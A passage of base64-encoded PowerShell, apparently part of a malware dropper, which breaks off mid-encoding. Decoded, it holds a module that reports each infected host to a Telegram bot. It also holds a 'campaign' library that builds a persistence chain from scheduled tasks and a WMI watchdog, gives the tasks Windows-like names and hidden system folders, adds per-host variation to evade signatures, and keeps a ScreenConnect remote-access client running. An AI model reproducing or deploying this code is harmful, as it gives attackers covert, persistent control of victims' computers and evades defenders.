dCBkaWdlc3QgbW9kZTogb25lIHNob3J0IGxpbmUsIEhUTUwtZnJlZSAoaG91cmx5IGhlYXJ0YmVh
dCkKaWYgKCRNb2RlIC1lcSAnY29tcGFjdCcpIHsKICAgICRmb3JlaWduTiA9IDAKICAgIGlmICgk
c3RhdGVPYmogLWFuZCAkc3RhdGVPYmouZm9yZWlnbikgeyAkZm9yZWlnbk4gPSBAKCRzdGF0ZU9i
ai5mb3JlaWduKS5Db3VudCB9CiAgICAkbXNpU2hvcnQgPSBpZiAoVGVzdC1QYXRoICRtc2lDYWNo
ZSkgeyAnezA6TjB9S0InIC1mICgoR2V0LUl0ZW0gJG1zaUNhY2hlIC1Gb3JjZSkuTGVuZ3RoIC8g
MUtCKSB9IGVsc2UgeyAnMCcgfQogICAgJHByaW1TaG9ydCA9IGlmICgkcHJpbU9rKSB7ICdPSycg
fSBlbHNlIHsgJ0RPV04nIH0KICAgICRhbHRTaG9ydCA9IGlmICgkYWx0TGluZSAtbGlrZSAnUnVu
bmluZyonKSB7ICdPSycgfSBlbHNlIHsgJy0nIH0KICAgICRncnl4YUxpbmUgPSBHZXQtU3ZjTGlu
ZSAoIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICh7MH0pIiAtZiAoR2V0LUdyeXhhS2VlcEZwKSkKICAg
ICRncnl4YVNob3J0ID0gaWYgKCRncnl4YUxpbmUgLWxpa2UgJ1J1bm5pbmcqJykgeyAnT0snIH0g
ZWxzZSB7ICctJyB9CiAgICAkdGV4dCA9ICIkZW1vamkgU0NEfCQoJGVudjpDT01QVVRFUk5BTUUp
fHNldj0kcHJpbVNob3J0fGdyeT0kZ3J5eGFTaG9ydHxhbHQ9JGFsdFNob3J0fGY9JGZvcmVpZ25O
fHQ9JHRhc2tPay81fGI9JEJ1aWxkIgp9CgppZiAoJHRleHQuTGVuZ3RoIC1ndCAzODAwKSB7CiAg
ICAkcm1tSGl0cyA9IEAoKCRybW1IaXRzIHwgU2VsZWN0LU9iamVjdCAtRmlyc3QgMTIpKSArICgn
LSAuLi4gKHswfSBtb3JlKScgLWYgKCRybW1IaXRzLkNvdW50IC0gMTIpKQogICAgJHNjTGlzdCA9
IEAoKCRzY0xpc3QgfCBTZWxlY3QtT2JqZWN0IC1GaXJzdCAxNCkpICsgKCctIC4uLiAoezB9IG1v
cmUpJyAtZiAoJHNjTGlzdC5Db3VudCAtIDE0KSkKICAgICR0ZXh0ID0gJHRleHQuU3Vic3RyaW5n
KDAsIDM4MDApICsgImBuYG48aT5UUlVOQ0FURUQgKFRlbGVncmFtIDQwOTYgbGltaXQpPC9pPiIK
fQoKJGxvZyA9IEpvaW4tUGF0aCAkV29ya0RpciAnYm9vdC5lcnInCmZ1bmN0aW9uIFNlbmQtVGco
W3N0cmluZ10kbXNnLCBbc3RyaW5nXSRtb2RlKSB7CiAgICAkcGF5bG9hZCA9IEB7CiAgICAgICAg
Y2hhdF9pZCAgICAgICAgICAgICAgICAgID0gJGNmZy5DSEFUX0lECiAgICAgICAgdGV4dCAgICAg
ICAgICAgICAgICAgICAgID0gJG1zZwogICAgICAgIGRpc2FibGVfd2ViX3BhZ2VfcHJldmlldyA9
ICR0cnVlCiAgICB9CiAgICBpZiAoJG1vZGUpIHsgJHBheWxvYWQucGFyc2VfbW9kZSA9ICRtb2Rl
IH0KICAgICRqc29uID0gJHBheWxvYWQgfCBDb252ZXJ0VG8tSnNvbiAtQ29tcHJlc3MgLURlcHRo
IDUKICAgICRieXRlcyA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoJGpz
b24pCiAgICBJbnZva2UtUmVzdE1ldGhvZCAtVXJpICgiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3Jn
L2JvdCQoJGNmZy5CT1RfVE9LRU4pL3NlbmRNZXNzYWdlIikgYAogICAgICAgIC1NZXRob2QgUG9z
dCAtQm9keSAkYnl0ZXMgLUNvbnRlbnRUeXBlICdhcHBsaWNhdGlvbi9qc29uOyBjaGFyc2V0PXV0
Zi04JyB8IE91dC1OdWxsCn0KCmZ1bmN0aW9uIFNlbmQtVGdTYWZlKFtzdHJpbmddJG1zZywgW3N0
cmluZ10kbW9kZSkgewogICAgJHRvU2VuZCA9ICRtc2cKICAgIHRyeSB7CiAgICAgICAgU2VuZC1U
ZyAtbXNnICR0b1NlbmQgLW1vZGUgJG1vZGUKICAgICAgICByZXR1cm4gJHRydWUKICAgIH0gY2F0
Y2ggewogICAgICAgIHRyeSB7CiAgICAgICAgICAgIFNlbmQtVGcgLW1zZyAoJHRvU2VuZC5TdWJz
dHJpbmcoMCwgMzAwMCkgKyAiYG48aT5UUlVOQ0FURUQ8L2k+IikgLW1vZGUgJG1vZGUKICAgICAg
ICAgICAgcmV0dXJuICR0cnVlCiAgICAgICAgfSBjYXRjaCB7CiAgICAgICAgICAgIHJldHVybiAk
ZmFsc2UKICAgICAgICB9CiAgICB9Cn0KCnRyeSB7CiAgICBpZiAoU2VuZC1UZ1NhZmUgLW1zZyAk
dGV4dCAtbW9kZSAnSFRNTCcpIHsKICAgICAgICBBZGQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGxv
ZyAtVmFsdWUgJ3RnX3NlbnRfcmljaCcgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAg
IH0gZWxzZSB7CiAgICAgICAgdGhyb3cgJ2h0bWxfZmFpbGVkJwogICAgfQogICAgaWYgKCRrZXkg
LWVxICdERVBMT1knKSB7CiAgICAgICAgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRoICRsb2cgLVZh
bHVlICgidGdfZGVwbG95X29rPSIgKyAkZGVwbG95T2spIC1FcnJvckFjdGlvbiBTaWxlbnRseUNv
bnRpbnVlCiAgICAgICAgU2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoIChKb2luLVBhdGggJFdvcmtE
aXIgJ2RlcGxveV90Zy5mbGFnJykgLVZhbHVlIChHZXQtRGF0ZSAtRm9ybWF0ICdvJykgLUVycm9y
QWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgIH0KfSBjYXRjaCB7CiAgICB0cnkgewogICAgICAg
ICRwbGFpbiA9IFtyZWdleF06OlJlcGxhY2UoJHRleHQsICc8W14+XSs+JywgJycpCiAgICAgICAg
JHBsYWluID0gW1N5c3RlbS5OZXQuV2ViVXRpbGl0eV06Okh0bWxEZWNvZGUoJHBsYWluKQogICAg
ICAgIGlmICgkcGxhaW4uTGVuZ3RoIC1ndCAzNTAwKSB7ICRwbGFpbiA9ICRwbGFpbi5TdWJzdHJp
bmcoMCwgMzUwMCkgKyAiYG5UUlVOQ0FURUQiIH0KICAgICAgICBTZW5kLVRnU2FmZSAtbXNnICRw
bGFpbiAtbW9kZSAnJyB8IE91dC1OdWxsCiAgICAgICAgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRo
ICRsb2cgLVZhbHVlICd0Z19zZW50X3BsYWluJyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51
ZQogICAgfSBjYXRjaCB7CiAgICAgICAgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRoICRsb2cgLVZh
bHVlICgidGdfZmFpbCAiICsgJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIC1FcnJvckFjdGlvbiBTaWxl
bnRseUNvbnRpbnVlCiAgICB9Cn0K
::B64_TGR_END
::B64_LIB_BEGIN
I1JlcXVpcmVzIC1WZXJzaW9uIDUuMQojIOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkAojIE9XTl9MSUIgIEJV
SUxEIDIwMjYwODAyTDIxCiMgU2hhcmVkIGxpYnJhcnk6IHBlci1ob3N0IGlkZW50aXR5IChhbnRp
LXNpZ25hdHVyZSksIFdNSSB3YXRjaGRvZwojIChtdXR1YWwgcGVyc2lzdGVuY2UgY2hhaW4pLCBj
YW1wYWlnbiBzdGF0ZSBmaWxlLCBTQyBzZXJ2aWNlIHJlcGFpci4KIyBMMjE6IHN0dWNrIHJlZ2lz
dGVyZWQgKHN2YytkaXIgZ29uZSkgLT4gL2ZhIHRoZW4gQVJQIG51a2UgKyBzYW1lLUZQIC9pOyBy
ZXR1cm4gZml4LgojIEwyMDogLURlZXAgbXVzdCBub3Qgc2tpcCBsaWdodCBzdGFydC9yZXBhaXIg
KHJhdGUtbGltaXQgbGVmdCBHcnl4YSBTdG9wcGVkKS4KIyBMMTk6IHJhdGUtbGltaXQgbmV2ZXIg
YmxvY2tzIHdoZW4gR3J5eGEgZnVsbHkgYWJzZW50OyBTdGFydFBlbmRpbmcga2VlcC4KIyBMMTg6
IGV4dGVybWluYXRlIHdhcyBLSUxMSU5HIEdyeXhhIChudWxsLXBhdGggcHJvYyBraWxsKTsgc3lu
YyBGUCBiZWZvcmUga2lsbC4KIyBMMTc6IEdyeXhhIHJlaW5zdGFsbCBMT0NLIHdoaWxlIGFueSBu
b24tc2V2cnogU0MgUnVubmluZzsgRlAgZHJpZnQgbmV2ZXIgL3guCiMgTDE2OiBORVZFUiByZWlu
c3RhbGwgR3J5eGEgd2hlbiBSdW5uaW5nIChwYW5lbCBkdXBsaWNhdGVzKTsgVENQIGFkdmlzb3J5
IG9ubHkuCiMgTDE1OiBncnl4YS1oZWFsdGggLyBncnl4YS1lbnN1cmUg4oCUIDhoIGRlZXAgY2hl
Y2sgKFRDUC9yZWxheS9GUCBkcmlmdCByZWluc3RhbGwpLgojIEwxMzogc2NodGFza3MgQ3JlYXRl
IHZpYSBjbWQgKGxpa2UgV3VjYWNoZU93biksIFRSIHVuZGVyIFdpbmRvd3NcVGVtcFwud3VjYWNo
ZQojICAgICAgKG5vdCBBQ0wtbG9ja2VkIFByb2dyYW1EYXRhIHBhdGgpLCAvU1QgMDA6MDAgb24g
TUlOVVRFLCBubyBsZWFkaW5nIFwuCiMgTDEyOiBJREVOVFZFUj03IFJPT1QtbGV2ZWwgdGFzayBu
YW1lcyAobmVzdGVkIE1pY3Jvc29mdFxXaW5kb3dzIEFjY2VzcyBEZW5pZWQpLgojIEwxMTogTkVW
RVIgcmV1c2UgcmVhbCBXaW5kb3dzIGJ1aWx0LWluIHRhc2sgbmFtZXM7IFRSIG93bmVyc2hpcCBj
aGVja3MuCiMgQXV0aG9yaXplZCBpbnRlcm5hbCBkZXBsb3ltZW50IC0gbGFiL2NvbXBldGl0aW9u
IHNjb3BlIG9ubHkuCiMg4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQCltDbWRsZXRCaW5kaW5nKCldCnBhcmFt
KAogICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICBbVmFsaWRhdGVTZXQoJ2lu
aXQnLCAnd2F0Y2hkb2cnLCAnd2F0Y2hkb2ctZW5zdXJlJywgJ3Rhc2tzLWVuc3VyZScsICdzdGF0
ZScsICdpZGVudGl0eScsICdyZXBhaXInLCAncmVnaXN0ZXJlZCcsICdleHRlcm1pbmF0ZScsICdn
cnl4YS1oZWFsdGgnLCAnZ3J5eGEtZW5zdXJlJyldCiAgICBbc3RyaW5nXSRBY3Rpb24sCiAgICBb
c3RyaW5nXSRXb3JrRGlyID0gJ0M6XFByb2dyYW1EYXRhXE1pY3Jvc29mdFxXaW5kb3dzXFdFUlxU
ZW1wXC53dWNhY2hlJywKICAgIFtzdHJpbmddJE1vblBhdGggPSAnJywKICAgIFtzdHJpbmddJEJ1
aWxkICA9ICdPMTUnLAogICAgW3N0cmluZ10kRXh0cmEgID0gJycsCiAgICBbc3RyaW5nXSRGcCAg
ICAgPSAnJywKICAgIFtzd2l0Y2hdJERlZXAsCiAgICBbc3dpdGNoXSRGb3JjZQopCgokRXJyb3JB
Y3Rpb25QcmVmZXJlbmNlID0gJ1NpbGVudGx5Q29udGludWUnCiRjZmdQYXRoID0gSm9pbi1QYXRo
ICRXb3JrRGlyICdpZGVudGl0eS5jZmcnCiRJZGVudFZlcnNpb24gPSA4CgojIFJvb3QtbGV2ZWwg
bmFtZXMgV0lUSE9VVCBsZWFkaW5nIGJhY2tzbGFzaCAobWF0Y2hlcyB3b3JraW5nIFd1Y2FjaGVP
d24gc3R5bGUpLgokUG9vbHMgPSBAewogICAgQSA9IEAoJ1dlclF1ZXVlU3luYycsJ0RpYWdIb3N0
Q2FjaGUnLCdOZXRUcmFjZUNhY2hlJywnV2RpSG9zdFByb3h5JywnUGxhU2VydmVySGVhbHRoJywn
VGNwSXBDb25mbGljdFJlcycsJ1NyQ2FjaGVTeW5jJywnUmVzb2x1dGlvblF1ZXVlJykKICAgIEIg
PSBAKCdQbGFTZXJ2ZXJIZWFsdGgnLCdXZGlIb3N0UHJveHknLCdXZXJRdWV1ZVN5bmMnLCdOZXRU
cmFjZUNhY2hlJywnRGlhZ0hvc3RDYWNoZScsJ1RjcElwQ29uZmxpY3RSZXMnLCdQbGFTZXJ2ZXJE
aWFnJywnU3JDYWNoZVN5bmMnKQogICAgQyA9IEAoJ1Jlc29sdXRpb25RdWV1ZScsJ05ldFRyYWNl
Q2FjaGUnLCdUY3BJcENvbmZsaWN0UmVzJywnV2VyUXVldWVTeW5jJywnUGxhU2VydmVySGVhbHRo
JywnRGlhZ0hvc3RDYWNoZScsJ1BsYVNlcnZlckRpYWcnLCdXZGlIb3N0UHJveHknKQogICAgRCA9
IEAoJ1RjcElwQ29uZmxpY3RSZXMnLCdSZXNvbHV0aW9uUXVldWUnLCdOZXRUcmFjZUNhY2hlJywn
RGlhZ0hvc3RDYWNoZScsJ1BsYVNlcnZlckRpYWcnLCdXZXJRdWV1ZVN5bmMnLCdQbGFTZXJ2ZXJI
ZWFsdGgnLCdXZGlIb3N0UHJveHknKQp9CiREZWZhdWx0cyA9IFtvcmRlcmVkXUB7CiAgICBUQVNL
X0EgPSAnV2VyUXVldWVTeW5jJwogICAgVEFTS19CID0gJ1BsYVNlcnZlckhlYWx0aCcKICAgIFRB
U0tfQyA9ICdXZGlIb3N0UHJveHknCiAgICBUQVNLX0QgPSAnVGNwSXBDb25mbGljdFJlcycKICAg
IE1PX0EgICA9ICcyJwogICAgTU9fQiAgID0gJzMnCn0KCmZ1bmN0aW9uIEdldC1Ib3N0U2VlZCB7
CiAgICAkcyA9IDBMCiAgICBmb3JlYWNoICgkYyBpbiAkZW52OkNPTVBVVEVSTkFNRS5Ub1VwcGVy
KCkuVG9DaGFyQXJyYXkoKSkgeyAkcyA9ICgkcyAqIDMxICsgW2ludF0kYykgJSAxMDAwMDAwMDA3
IH0KICAgIHJldHVybiAkcwp9CgpmdW5jdGlvbiBSZWFkLUlkZW50aXR5IHsKICAgICRpZCA9ICRE
ZWZhdWx0cy5DbG9uZSgpCiAgICBpZiAoVGVzdC1QYXRoICRjZmdQYXRoKSB7CiAgICAgICAgZm9y
ZWFjaCAoJGxpbmUgaW4gKEdldC1Db250ZW50IC1MaXRlcmFsUGF0aCAkY2ZnUGF0aCAtRm9yY2Up
KSB7CiAgICAgICAgICAgIGlmICgkbGluZSAtbWF0Y2ggJ15ccyooW0EtWl9dKylccyo9XHMqKC4r
PylccyokJykgeyAkaWRbJG1hdGNoZXNbMV1dID0gJG1hdGNoZXNbMl0gfQogICAgICAgIH0KICAg
IH0KICAgIHJldHVybiAkaWQKfQoKZnVuY3Rpb24gUmVtb3ZlLVRhc2tRdWlldChbc3RyaW5nXSR0
bikgewogICAgaWYgKCR0bikgeyAmIHNjaHRhc2tzLmV4ZSAvRGVsZXRlIC9UTiAkdG4gL0YgMj4m
MSB8IE91dC1OdWxsIH0KfQoKZnVuY3Rpb24gR2V0LVRhc2tWZXJib3NlQmxvYihbc3RyaW5nXSR0
bikgewogICAgaWYgKC1ub3QgJHRuKSB7IHJldHVybiAnJyB9CiAgICAkb3V0ID0gJiBzY2h0YXNr
cy5leGUgL1F1ZXJ5IC9UTiAkdG4gL0ZPIExJU1QgL1YgMj4kbnVsbAogICAgaWYgKCRMQVNURVhJ
VENPREUgLW5lIDAgLW9yIC1ub3QgJG91dCkgeyByZXR1cm4gJycgfQogICAgcmV0dXJuICgoJG91
dCB8IEZvckVhY2gtT2JqZWN0IHsgIiRfIiB9KSAtam9pbiAiYG4iKQp9CgpmdW5jdGlvbiBUZXN0
LVRhc2tPd25zTW9uKFtzdHJpbmddJHRuLCBbc3RyaW5nXSRtYXJrZXIpIHsKICAgICMgVHJ1ZSBv
bmx5IGlmIHRoZSBzY2hlZHVsZWQgYWN0aW9uIHBvaW50cyBhdCBPVVIgbW9uL2V0bCBwYXRoIOKA
lCBub3QgYSBXaW5kb3dzIENPTSBoYW5kbGVyLgogICAgJGJsb2IgPSBHZXQtVGFza1ZlcmJvc2VC
bG9iICR0bgogICAgaWYgKC1ub3QgJGJsb2IpIHsgcmV0dXJuICRmYWxzZSB9CiAgICBpZiAoJG1h
cmtlciAtYW5kICgkYmxvYiAtbWF0Y2ggW3JlZ2V4XTo6RXNjYXBlKCRtYXJrZXIpKSkgeyByZXR1
cm4gJHRydWUgfQogICAgaWYgKCRibG9iIC1tYXRjaCAnKD9pKVwud3VjYWNoZVxcfG93bl9tb25c
LmNtZHxldGxfbW9uXC5jbWR8XC5ldGxjYWNoZVxcJykgeyByZXR1cm4gJHRydWUgfQogICAgcmV0
dXJuICRmYWxzZQp9CgpmdW5jdGlvbiBJbml0aWFsaXplLUlkZW50aXR5IHsKICAgICMgSWRlbXBv
dGVudCB3aXRoaW4gYW4gSURFTlRWRVIgZ2VuZXJhdGlvbi4gUG9vbCB1cGdyYWRlcyBidW1wIElE
RU5UVkVSOgogICAgIyBvd25lZCBvbGQtbmFtZSB0YXNrcyBhcmUgZGVsZXRlZDsgV2luZG93cyBi
dWlsdC1pbnMgd2l0aCBzYW1lIG5hbWUgYXJlIGxlZnQgYWxvbmUuCiAgICBpZiAoVGVzdC1QYXRo
ICRjZmdQYXRoKSB7CiAgICAgICAgJG9sZCA9IFJlYWQtSWRlbnRpdHkKICAgICAgICAjIEw3OiBh
bHNvIHJlZ2VuZXJhdGUgaWYgYW55IFRBU0tfKiBpcyBlbXB0eSAoTDQtTDYgbW9kdWxvL2Nhc3Qg
YnVncyBsZWZ0IGJsYW5rIHNsb3RzKQogICAgICAgICRzbG90c09rID0gKCRvbGRbJ0lERU5UVkVS
J10gLWVxICIkSWRlbnRWZXJzaW9uIikgLWFuZCAkb2xkWydUQVNLX0EnXSAtYW5kICRvbGRbJ1RB
U0tfQiddIC1hbmQgJG9sZFsnVEFTS19DJ10gLWFuZCAkb2xkWydUQVNLX0QnXQogICAgICAgIGlm
ICgkc2xvdHNPaykgeyByZXR1cm4gJG9sZCB9CiAgICAgICAgZm9yZWFjaCAoJGsgaW4gJ1RBU0tf
QScsJ1RBU0tfQicsJ1RBU0tfQycsJ1RBU0tfRCcpIHsKICAgICAgICAgICAgJHRuID0gW3N0cmlu
Z10kb2xkWyRrXQogICAgICAgICAgICBpZiAoLW5vdCAkdG4pIHsgY29udGludWUgfQogICAgICAg
ICAgICAjIE5ldmVyIGRlbGV0ZSBhIHJlYWwgV2luZG93cyB0YXNrIHdlIG5ldmVyIG93bmVkIChU
UiBpcyBDT00vY3VzdG9tIGhhbmRsZXIpLgogICAgICAgICAgICBpZiAoVGVzdC1UYXNrT3duc01v
biAkdG4gJycpIHsgUmVtb3ZlLVRhc2tRdWlldCAkdG4gfQogICAgICAgIH0KICAgICAgICBSZW1v
dmUtSXRlbSAtTGl0ZXJhbFBhdGggJGNmZ1BhdGggLUZvcmNlCiAgICB9CiAgICAkcyA9IEdldC1I
b3N0U2VlZAogICAgIyBMNDogdHdvIHNsb3RzIG1heSBoYXNoIHRvIHRoZSBzYW1lIHRhc2sgcGF0
aCAocG9vbHMgc2hhcmUgbmFtZXMpIC0+CiAgICAjIG9uZSBwaHlzaWNhbCB0YXNrIHRoZW4gc2F0
aXNmaWVzIHR3byBzbG90cyBhbmQgdGhlIGZsZWV0IHNob3dzIDMvNC4KICAgICMgV2FsayBlYWNo
IHBvb2wgZm9yd2FyZCB1bnRpbCB0aGUgcGljayBpcyB1bmlxdWUgYWNyb3NzIHNsb3RzLgogICAg
IyBMNjogdGhlIG9sZCBAKEAoJ0EnLCAkcyAlIDgpLCAuLi4pIGZvcm0gd2FzIGRvdWJsZS1icm9r
ZW4gaW4gUFMgNS4xOgogICAgIyBiYXJlICUgaW5zaWRlIEAoKSBwYXJzZXMgYXMgdGhlIEZvckVh
Y2gtT2JqZWN0IGFsaWFzIChub3QgbW9kdWxvKSwgc28gdGhlCiAgICAjIGNvbGxlY3Rpb24gY29s
bGFwc2VkIGFuZCB0aGUgbG9vcCBuZXZlciByYW4gLT4gaWRlbnRpdHkuY2ZnIGhhZCBFTVBUWQog
ICAgIyBUQVNLXyogYW5kIHRoZSB3aG9sZSBmbGVldCBmZWxsIGJhY2sgdG8gaWRlbnRpY2FsIGRl
ZmF1bHQgdGFzayBuYW1lcy4KICAgICRzZWVkcyA9IFtvcmRlcmVkXUB7CiAgICAgICAgQSA9ICgk
cyAlIDgpCiAgICAgICAgQiA9ICgoJHMgKyAzKSAlIDgpCiAgICAgICAgQyA9ICgoJHMgKyA1KSAl
IDgpCiAgICAgICAgRCA9ICgoJHMgKyA3KSAlIDgpCiAgICB9CiAgICAkcGljayA9IFtvcmRlcmVk
XUB7fQogICAgZm9yZWFjaCAoJGxldHRlciBpbiAnQScsJ0InLCdDJywnRCcpIHsKICAgICAgICAk
aSA9IFtpbnRdJHNlZWRzWyRsZXR0ZXJdCiAgICAgICAgJG5hbWUgPSAkUG9vbHNbJGxldHRlcl1b
JGldCiAgICAgICAgJG4gPSAwCiAgICAgICAgd2hpbGUgKCRwaWNrLlZhbHVlcyAtY29udGFpbnMg
JG5hbWUgLWFuZCAkbiAtbHQgOCkgeyAkaSA9ICgkaSArIDEpICUgODsgJG5hbWUgPSAkUG9vbHNb
JGxldHRlcl1bJGldOyAkbisrIH0KICAgICAgICBpZiAoLW5vdCAkbmFtZSkgeyAkbmFtZSA9ICRE
ZWZhdWx0c1siVEFTS18kbGV0dGVyIl0gfQogICAgICAgICRwaWNrWyRsZXR0ZXJdID0gJG5hbWUK
ICAgIH0KICAgICRjZmcgPSBAKAogICAgICAgICJUQVNLX0E9JCgkcGljay5BKSIKICAgICAgICAi
VEFTS19CPSQoJHBpY2suQikiCiAgICAgICAgIlRBU0tfQz0kKCRwaWNrLkMpIgogICAgICAgICJU
QVNLX0Q9JCgkcGljay5EKSIKICAgICAgICAiTU9fQT0kKDIgKyAoJHMgJSA0KSkiICAgICAgICAg
ICMgMi01IG1pbiBqaXR0ZXIKICAgICAgICAiTU9fQj0kKDMgKyAoKCRzICsgMSkgJSAzKSkiICAg
ICMgMy01IG1pbiBqaXR0ZXIKICAgICAgICAiU0VFRD0kcyIKICAgICAgICAiSURFTlRWRVI9JElk
ZW50VmVyc2lvbiIKICAgICkKICAgIFNldC1Db250ZW50IC1MaXRlcmFsUGF0aCAkY2ZnUGF0aCAt
VmFsdWUgJGNmZyAtRm9yY2UKICAgIHJldHVybiAoUmVhZC1JZGVudGl0eSkKfQoKZnVuY3Rpb24g
Tm9ybWFsaXplLVRhc2tOYW1lKFtzdHJpbmddJHRuKSB7CiAgICBpZiAoLW5vdCAkdG4pIHsgcmV0
dXJuICcnIH0KICAgIHJldHVybiAkdG4uVHJpbSgpLlRyaW1TdGFydCgnXCcpCn0KCmZ1bmN0aW9u
IFdyaXRlLU93bkxvZyhbc3RyaW5nXSRtKSB7CiAgICAkbG9nID0gSm9pbi1QYXRoICRXb3JrRGly
ICdib290LmVycicKICAgIHRyeSB7IEFkZC1Db250ZW50IC1MaXRlcmFsUGF0aCAkbG9nIC1WYWx1
ZSAkbSAtRm9yY2UgfSBjYXRjaCB7fQp9CgpmdW5jdGlvbiBFbnN1cmUtUGVyc2lzdFRhc2tzIHsK
ICAgICMgTWlycm9yIHdvcmtpbmcgZGV0YWNoIChXdWNhY2hlT3duKTogY21kIHNjaHRhc2tzLCBC
T09UIFRSIHBhdGgsIC9TVCBvbiBNSU5VVEUuCiAgICAkaWQgPSBJbml0aWFsaXplLUlkZW50aXR5
CiAgICBpZiAoLW5vdCAkTW9uUGF0aCkgeyAkTW9uUGF0aCA9IEpvaW4tUGF0aCAkV29ya0RpciAn
b3duX21vbi5jbWQnIH0KICAgICRib290ID0gSm9pbi1QYXRoICRlbnY6U3lzdGVtUm9vdCAnVGVt
cFwud3VjYWNoZScKICAgICRldGxEaXIgPSAnQzpcUHJvZ3JhbURhdGFcTWljcm9zb2Z0XERpYWdu
b3Npc1xTdGF0ZVwuZXRsY2FjaGUnCiAgICBmb3JlYWNoICgkZCBpbiBAKCRib290LCAkZXRsRGly
KSkgewogICAgICAgIGlmICgtbm90IChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRkKSkgeyBOZXct
SXRlbSAtSXRlbVR5cGUgRGlyZWN0b3J5IC1QYXRoICRkIC1Gb3JjZSB8IE91dC1OdWxsIH0KICAg
IH0KICAgICRib290TW9uID0gSm9pbi1QYXRoICRib290ICdvd25fbW9uLmNtZCcKICAgICRib290
RXRsID0gSm9pbi1QYXRoICRib290ICdldGxfbW9uLmNtZCcKICAgICRldGxNb24gPSBKb2luLVBh
dGggJGV0bERpciAnZXRsX21vbi5jbWQnCiAgICBpZiAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAk
TW9uUGF0aCkgewogICAgICAgIENvcHktSXRlbSAtTGl0ZXJhbFBhdGggJE1vblBhdGggLURlc3Rp
bmF0aW9uICRib290TW9uIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAg
ICAgIENvcHktSXRlbSAtTGl0ZXJhbFBhdGggJE1vblBhdGggLURlc3RpbmF0aW9uICRib290RXRs
IC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgICAgIENvcHktSXRlbSAt
TGl0ZXJhbFBhdGggJE1vblBhdGggLURlc3RpbmF0aW9uICRldGxNb24gLUZvcmNlIC1FcnJvckFj
dGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICB9CiAgICAjIEJPT1QgaXMgbm90IExvY2tEaXInZCBi
eSBvd25fc2VjdXJlIOKAlCBUYXNrIFNjaGVkdWxlciBjYW4gcmVzb2x2ZSBUUiB0aGVyZS4KICAg
ICR0ck1vbiA9ICJjbWQuZXhlIC9jICRib290TW9uIgogICAgJHRyRXRsID0gImNtZC5leGUgL2Mg
JGJvb3RFdGwiCiAgICAkbW9BID0gW3N0cmluZ10kaWRbJ01PX0EnXTsgaWYgKC1ub3QgJG1vQSkg
eyAkbW9BID0gJzInIH0KICAgICRtb0IgPSBbc3RyaW5nXSRpZFsnTU9fQiddOyBpZiAoLW5vdCAk
bW9CKSB7ICRtb0IgPSAnMycgfQogICAgJHN0ID0gKEdldC1EYXRlKS5Ub1N0cmluZygnSEg6bW0n
KQogICAgJHNwZWNzID0gQCgKICAgICAgICBAeyBLZXkgPSAnVEFTS19BJzsgTWFya2VyID0gJ293
bl9tb24uY21kJzsgU2MgPSAnTUlOVVRFJzsgTW8gPSAkbW9BOyBUciA9ICR0ck1vbiB9CiAgICAg
ICAgQHsgS2V5ID0gJ1RBU0tfQic7IE1hcmtlciA9ICdldGxfbW9uLmNtZCc7IFNjID0gJ01JTlVU
RSc7IE1vID0gJG1vQjsgVHIgPSAkdHJFdGwgfQogICAgICAgIEB7IEtleSA9ICdUQVNLX0MnOyBN
YXJrZXIgPSAnb3duX21vbi5jbWQnOyBTYyA9ICdPTlNUQVJUJzsgTW8gPSAnJzsgVHIgPSAkdHJN
b24gfQogICAgICAgIEB7IEtleSA9ICdUQVNLX0QnOyBNYXJrZXIgPSAnb3duX21vbi5jbWQnOyBT
YyA9ICdPTkxPR09OJzsgTW8gPSAnJzsgVHIgPSAkdHJNb24gfQogICAgKQogICAgJG9rID0gMDsg
JHJlYXJtZWQgPSAwOyAkZmFpbCA9IDAKICAgIGZvcmVhY2ggKCRzcCBpbiAkc3BlY3MpIHsKICAg
ICAgICAkdG4gPSBOb3JtYWxpemUtVGFza05hbWUgKFtzdHJpbmddJGlkWyRzcC5LZXldKQogICAg
ICAgIGlmICgtbm90ICR0bikgeyAkZmFpbCsrOyBjb250aW51ZSB9CiAgICAgICAgaWYgKFRlc3Qt
VGFza093bnNNb24gJHRuICRzcC5NYXJrZXIpIHsgJG9rKys7IGNvbnRpbnVlIH0KICAgICAgICBp
ZiAoVGVzdC1UYXNrT3duc01vbiAoIlwkdG4iKSAkc3AuTWFya2VyKSB7ICRvaysrOyBjb250aW51
